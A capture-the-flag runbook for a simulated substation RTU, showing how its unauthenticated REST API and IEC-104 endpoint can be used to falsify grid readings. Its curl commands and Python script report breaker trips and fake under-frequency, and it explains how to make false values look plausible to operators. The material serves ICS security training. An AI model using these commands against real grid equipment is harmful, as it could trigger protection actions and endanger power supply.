# Runbook: IEC-104 datapoint falsification

The substation RTU exposes a REST management API with no authentication
alongside the standard IEC-104 protocol endpoint. Any caller can POST new values
to any datapoint via the REST API. An IEC-104 master polling the RTU then
receives those values as if they were real measurements. The attacker does not
need to speak IEC-104; the REST API does the hard part.

- Techniques: 
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [Data integrity manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-integrity-manipulation)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
```

Minimal containers: `substation-rtu`

No pivot host is needed: the REST API on port 8080 and the IEC-104 endpoint on
port 2404 are both reachable directly from the internet zone. `unseen-gate` is
the intended attack host. To observe an IEC-104 master receiving the falsified
values, also bring up any component configured to poll this RTU.

Entry point: any host with a route to `substation-rtu` (10.10.5.14). Both
the internet zone and the DMZ have direct access.

## Background

`substation-rtu` simulates the Dolly Sisters and Nap Hill feeder segment of the
UUPL substation. It exposes IEC-60870-5-104 on port 2404 and a REST management
API on port 8080 with no authentication. The pre-seeded datapoints are
internally consistent:

| Datapoint          | Type         | Initial value | Description             |
|--------------------|--------------|---------------|-------------------------|
| feeder_a_voltage   | M_ME_NC_1    | 10.8          | Feeder A voltage, kV    |
| feeder_b_voltage   | M_ME_NC_1    | 11.1          | Feeder B voltage, kV    |
| load_current       | M_ME_NC_1    | 340.0         | Load current, A         |
| frequency          | M_ME_NC_1    | 49.98         | Grid frequency, Hz      |
| breaker_a_state    | M_SP_NA_1    | true          | Feeder A breaker closed |
| breaker_b_state    | M_SP_NA_1    | true          | Feeder B breaker closed |

Internally consistent readings matter for the attack: setting feeder voltage
to zero while leaving breaker state as true creates an operationally impossible
reading. A trained operator may notice the inconsistency; many alarm systems
will not.

## Attack path

### Stage 1: enumerate the REST API

```bash
# Discover available endpoints
curl -s http://10.10.5.14:8080/
# Returns API index with available routes

# List all datapoints with current values and types
curl -s http://10.10.5.14:8080/datapoints
# [
#   {"id":1,"name":"feeder_a_voltage","type":13,"value":10.8},
#   {"id":2,"name":"feeder_b_voltage","type":13,"value":11.1},
#   {"id":3,"name":"load_current",    "type":13,"value":340.0},
#   {"id":4,"name":"frequency",       "type":13,"value":49.98},
#   {"id":5,"name":"breaker_a_state", "type":1, "value":true},
#   {"id":6,"name":"breaker_b_state", "type":1, "value":true}
# ]
```

### Stage 2: falsify a voltage reading

```bash
# Set feeder A voltage to zero while the breaker state stays true
# An IEC-104 master receives 0 kV with the breaker showing closed: physically impossible
curl -s -X POST http://10.10.5.14:8080/datapoints/1 \
  -H 'Content-Type: application/json' \
  -d '{"value": 0.0}'
# {"status":"ok"}

# Verify the change
curl -s http://10.10.5.14:8080/datapoints/1
# {"id":1,"name":"feeder_a_voltage","type":13,"value":0.0}
```

### Stage 3: falsify frequency to trigger protection response

```bash
# Grid frequency out of range triggers automatic under/over-frequency protection
# Normal operating band: 49.8–50.2 Hz
# Under-frequency trip: typically 47.5 Hz
curl -s -X POST http://10.10.5.14:8080/datapoints/4 \
  -H 'Content-Type: application/json' \
  -d '{"value": 47.2}'
# Any SCADA system polling this RTU via IEC-104 now sees an under-frequency condition
# Automated response: load shedding, protection relay action
```

### Stage 4: trip breakers via the REST API

```bash
# Open both feeders: reported as breaker trip, load disconnected from the operator's perspective
curl -s -X POST http://10.10.5.14:8080/datapoints/5 \
  -H 'Content-Type: application/json' \
  -d '{"value": false}'

curl -s -X POST http://10.10.5.14:8080/datapoints/6 \
  -H 'Content-Type: application/json' \
  -d '{"value": false}'

# SCADA now shows both feeders open, zero voltage, 47 Hz
# Operator response: emergency calls, attempted manual re-close, field crew dispatched
# Actual field equipment: unchanged
```

### Stage 5: interact via native IEC-104 protocol

```bash
# For participants who want to use the IEC-104 protocol directly
# lib60870-python or similar client library

python3 - <<'EOF'
from lib60870.lib60870 import Connection, T104Connection, CauseOfTransmission
import lib60870.lib60870 as lib60870

conn = T104Connection("10.10.5.14", 2404)
conn.connect()

# Send STARTDT to begin data transfer
conn.sendStartDT()

# The RTU begins sending spontaneous data (class 1 and 2)
# Inspect ASDUs for M_ME_NC_1 (type 13) and M_SP_NA_1 (type 1)

# Send a single command to operate a breaker
# C_SC_NA_1 (type 45): single command
conn.sendControlCommand(
    CauseOfTransmission.ACTIVATION,
    common_address=20,
    io_address=5,
    command=lib60870.SingleCommand(False, False, 0)  # trip breaker_a
)
EOF
```

## Consistent vs inconsistent falsification

The readings matter as much as the method. Setting feeder voltage to zero while
the breaker shows closed is inconsistent: zero voltage with a closed breaker
implies a fault on the feeder, not a breaker trip. A real fault would trigger
overcurrent protection within milliseconds. The inconsistency may trigger an
alarm rather than a clean operator response, and an attentive engineer may
investigate the RTU directly.

Setting voltage to a plausible low value (8.5 kV rather than 0) while leaving
frequency normal creates a voltage sag condition that looks like a network
problem rather than a sensor fault. The operator calls the network operations
centre. That is the operational impact: not a visible hack, but a chain of
wasted responses to conditions that do not exist.

## Flag placement

Place the flag as a datapoint value with a distinctive name:

```bash
curl -s -X POST http://10.10.5.14:8080/datapoints \
  -H 'Content-Type: application/json' \
  -d '{"name":"ctf_flag","type":13,"value":1.0}'
```

Then add the flag string as a comment or label field, or embed it in a
custom datapoint unit field. The participant discovers it by listing all
datapoints and noticing the non-standard entry.

## Why IEC-104 has no authentication

IEC-60870-5-104 was designed for serial and IP communication in environments
where the network was assumed to be physically secure. Authentication was added
as an optional extension (IEC 62351-5) but is rarely implemented: it requires
both ends to be configured, adds complexity, and breaks with legacy equipment.
The standard assumption is network isolation. A REST management API on the same
host with no authentication is a way to sidestep even that assumption, giving
any caller on any accessible network the ability to write values that the
IEC-104 protocol then reports as authoritative measurements.
